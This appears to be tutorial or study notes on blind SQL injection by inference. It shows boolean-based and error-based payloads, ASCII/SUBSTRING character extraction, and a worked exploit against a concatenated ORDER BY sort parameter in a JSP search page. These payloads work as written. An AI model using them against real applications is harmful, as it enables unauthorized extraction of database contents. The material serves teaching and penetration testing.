# Using Inference: Conditional Responses

When **no results or errors are returned** from injected queries and **no outbound channels** are available (e.g., due to internal network firewalls), attackers can still extract data using **inference-based SQL injection** techniques.

These techniques **infer information** by observing subtle changes in the application’s behavior based on injected **conditional logic**.

---

## **Conditional Behavior-Based Extraction**

The application’s response changes based on injected conditions:
```sql
admin' AND 1=1--    → Logs in
admin' AND 1=2--    → Fails login
```

You can use this behavior to determine **truth values** inside the database. Example using ASCII and SUBSTRING:
```sql
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 65--  → Logs in (true)
admin' AND ASCII(SUBSTRING('Admin',1,1)) = 66--  → Fails login (false)
```

By cycling through ASCII values, you can reconstruct a string **one character at a time**.

---

## **Inducing Conditional Errors**

When visible behavior (e.g., login success/failure) is **not available**, use **error-based inference**:

- Rely on **short-circuit evaluation** in SQL (only evaluate necessary expressions).
- Inject a condition that, if true, causes a **syntactic error** (e.g., divide by zero).

### Example (Oracle / MS-SQL):

**Case 1: User exists (causes error)**
```sql
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'DBSNMP') = 'DBSNMP'
```

**Case 2: User doesn’t exist (no error)**
```sql
SELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE username = 'AAAAAA') = 'AAAAAA'
```

If the WHERE clause is **false**, `1/0` is **not evaluated**, so no error occurs. Otherwise, an error confirms the truth of the condition.

> This allows testing **arbitrary boolean conditions** indirectly.

---

## **Generalized Form of the Attack**

You can structure conditional error tests like:
```sql
(SELECT 1 WHERE <<condition>> OR 1/0=0)
```

This enables inference even when injecting into **non-visible** parts of the query.

---

## **Practical Example: Sort Parameter Injection**

Application:
```http
/search.jsp?department=30&sort=ename
```

Back-end query:
```java
SELECT ename, job, deptno, hiredate FROM emp WHERE deptno = ? ORDER BY " + sort + " DESC
```

- `department` is parameterized
- `sort` is **concatenated directly** and **vulnerable**

### Exploit:
```http
/search.jsp?department=20&sort=(
  SELECT 1/0 FROM dual WHERE
  (SELECT SUBSTR(MAX(object_name),1,1) FROM user_objects) = 'Y'
)
```

- If the **first letter** of any `object_name` is `'Y'`, error occurs due to `1/0`.
- If not, the query executes normally.

This allows attackers to:
- Check a condition bit by bit
- Retrieve data with tools like **SQLMap** or **Absinthe**

---

## **Summary**

- Inference techniques are powerful in **blind SQLi** scenarios.
- Two major methods:
  - **Boolean-based inference** (response differs based on condition)
  - **Error-based inference** (induce an error on true condition)
- These work even when:
  - No query results are returned
  - No network channels are available
  - You can only control subqueries or parts of the SQL

> **TIP**: Use ASCII + SUBSTRING (or equivalent) functions for fine-grained character extraction. Use error-based logic when application behavior is not visibly altered.

---
